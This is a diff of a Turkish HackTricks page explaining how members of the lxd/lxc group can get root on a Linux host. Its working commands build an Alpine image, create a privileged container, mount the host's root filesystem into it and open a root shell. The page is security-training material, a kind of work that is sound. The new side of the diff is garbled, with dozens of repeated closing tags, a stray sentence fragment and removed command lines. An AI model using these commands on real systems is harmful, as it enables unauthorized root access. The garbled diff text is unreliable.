@@ -1,26 +1,51 @@
-# lxd/lxc Grubu - Ayrıcalık yükseltme
+# lxd/lxc Grubu - Yetki Yükseltme
+
+{% hint style="success" %}
+AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'i desteklemenin diğer yolları:
-
-* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
 
-Eğer _**lxd**_ **veya** _**lxc**_ **grubuna** ait iseniz, kök kullanıcı olabilirsiniz.
+_eğer_ **lxd** _veya_ **lxc** _grubuna ait iseniz, root olabilirsiniz_
 
-## İnternet olmadan sömürme
+## İnternetsiz Sömürü
 
 ### Yöntem 1
 
-Bu dağıtım oluşturucuyu makinenize kurabilirsiniz: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(github'daki talimatları takip edin):
+Bu dağıtım oluşturucusunu makinenize kurabilirsiniz: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(github talimatlarını takip edin):
 ```bash
 sudo su
 #Install requirements
@@ -38,7 +63,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 #Create the container
 sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
 ```
-Dosyaları **lxd.tar.xz** ve **rootfs.squashfs** olarak yükleyin, görüntüyü depoya ekleyin ve bir konteyner oluşturun:
+Dosyaları **lxd.tar.xz** ve **rootfs.squashfs** yükleyin, resmi depoya ekleyin ve bir konteyner oluşturun:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -54,11 +79,11 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 {% hint style="danger" %}
-Eğer bu hatayı bulursanız _**Hata: Depolama havuzu bulunamadı. Lütfen yeni bir depolama havuzu oluşturun**_\
-**`lxd init`** komutunu çalıştırın ve önceki komut parçacığını **tekrarlayın**
+Eğer bu hatayı bulursanız _**Hata: Depo havuzu bulunamadı. Lütfen yeni bir depo havuzu oluşturun**_\
+**`lxd init`** komutunu çalıştırın ve **önceki** komut grubunu **tekrarlayın**
 {% endhint %}
 
-Son olarak, konteyneri çalıştırabilir ve root erişimi elde edebilirsiniz:
+Sonunda konteyneri çalıştırabilir ve root alabilirsiniz:
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
@@ -66,7 +91,7 @@ lxc exec privesc /bin/sh
 ```
 ### Yöntem 2
 
-Bir Alpine imajı oluşturun ve `security.privileged=true` bayrağını kullanarak başlatın, böylece konteynerin ana dosya sistemiyle kök olarak etkileşimde bulunması zorlanır.
+Bir Alpine imajı oluşturun ve `security.privileged=true` bayrağını kullanarak başlatın, böylece konteynerin ana dosya sistemi ile root olarak etkileşimde bulunmasını zorlayın.
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -86,37 +111,65 @@ lxc init myimage mycontainer -c security.privileged=true
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 
-# interact with the container
-lxc start mycontainer
-lxc exec mycontainer /bin/sh
-```
-Alternatif olarak [https://github.com/initstring/lxd\_root](https://github.com/initstring/lxd\_root)
-
-## İnternet ile
-
-[Şu talimatları](https://reboare.github.io/lxd/lxd-escape.html) takip edebilirsiniz.
-```bash
-lxc init ubuntu:16.04 test -c security.privileged=true
-lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
-lxc start test
-lxc exec test bash
-[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
-```
-## Referanslar
-
-* [https://reboare.github.io/lxd/lxd-escape.html](https://reboare.github.io/lxd/lxd-escape.html)
-* [https://etcpwd13.github.io/greyfriar_blog/blog/writeup/Notes-Included/](https://etcpwd13.github.io/greyfriar_blog/blog/writeup/Notes-Included/)
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>
+<summary>Support HackTricks</summary>
 
-HackTricks'i desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin.**
-* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+
+{% endhint %}
+</details>
+{% endhint %}
